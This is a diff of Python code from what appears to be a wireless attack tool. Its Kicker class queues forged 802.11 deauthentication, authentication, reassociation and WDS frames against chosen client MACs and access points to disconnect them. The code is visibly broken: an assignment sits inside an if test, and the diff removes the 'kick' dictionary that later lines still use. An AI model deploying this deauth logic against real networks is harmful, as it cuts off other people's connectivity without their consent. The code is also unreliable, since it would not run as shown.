@@ -312,7 +312,7 @@ class Kicker:
     def __init__(self, ctx):
         self.lorconCtx = ctx
         self.engine = Gen80211.packetGenerator()
-
+				
     # We're going to need to adjust targets to be matched to attack
     def makeMagic(self, targets, pnap = 0):
         """
@@ -335,72 +335,36 @@ class Kicker:
 				kickmethod = obj.kickmethod
 				
 				#set the vars that act as the parameters to the deauthengine
+				# This is kinda a hack job.
 				channel = ap.channel
 				client_mac = obj.mac
 				bssid = ap.bssid
-				
-				#we will see about static assignment above this for loop to save speed
-				kick = {
-							1:packetQue.extend(self.engine.deauthPacketEngine()),
-							2:packetQue.extend(self.engine.deauthPacketEngine()),
-							3:packetQue.extend(self.engine.deauthPacketEngine()),
-							4:packetQue.extend(self.engine.deauthPacketEngine())
-				}
-				
+
+				# If it's not a list, make it one
+				if isinstance(kickmethod,types.IntType):
+					kickmethod = [kickmethod]
+				# Well, looks like we got us a cowboy
+				if kickmethod == 0:
+					kickmethod = [1,2,3,4]
+				# Kick according to attacks in list
+				if 1 in kickmethod:
+					packetQue.extend(self.engine.deauthPacketEngine(True,client_mac,bssid,bssid,channel))
+				if 2 in kickmethod:
+					packetQue.extend(self.engine.authPacketEngine(True,client_mac,bssid,bssid,channel))
+				if 3 in kickmethod:
+					packetQue.extend(self.engine.reassPacketEngine(True,client_mac,bssid,bssid,channel))
+				if 4 in kickmethod:
+					packetQue.extend(self.engine.wdsPacketEngine(True,bssid,client_mac,bssid,channel))
 				#pew pew pew! Fire deauth packets!
 				if kickmethod = 0:
 					while kickmethod != 4:
 						kickmethod = kickmethod + 1
-						kick[kickmethod] # god i'm lazy
+						kick[kickmethod] 
 				else:
 					kick[kickmethod]
 					
 			elif obj.type == "accessPoint": # I Disagree with this camelcase
 				pass # currently unimplemented.  Will hold autoimmune attacks
-				
-				
-""" #OLD SHIZ
-        for bssid in targets:
-            for client in targets[bssid][1]:
-                 if client in attacks.keys():
-                    attacklist = attacks[client].keys()
-                 else:
-                    print "bad looping"
-                    pdb.set_trace()
-                    continue
-                 if '0' in attacklist:
-                    # make all attacks run
-                    attacklist = ['1','2','3','4']
-                 if '1' in attacklist:
-                    packetQue.extend(
-                    self.engine.deauthPacketEngine(
-                            targets[bssid][0]["allow"],
-                            client, bssid, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                 elif '2' in attacklist:
-                    packetQue.extend(
-                    self.engine.authPacketEngine(
-                            targets[bssid][0]["allow"],
-                            client, bssid, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                 elif '3' in attacklist:
-                    packetQue.extend(
-                    self.engine.reassPacketEngine(
-                            targets[bssid][0]["allow"],
-                            client, bssid, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                 elif '4' in attacklist:
-                    packetQue.extend(
-                    self.engine.wdsPacketEngine(
-                            targets[bssid][0]["allow"],
-                            bssid, client, bssid,
-                            targets[bssid][0]["channel"]
-                            ))
-                    
-""" #End old Shiz
 
         numPackets = len(packetQue)
         message.printMessage(
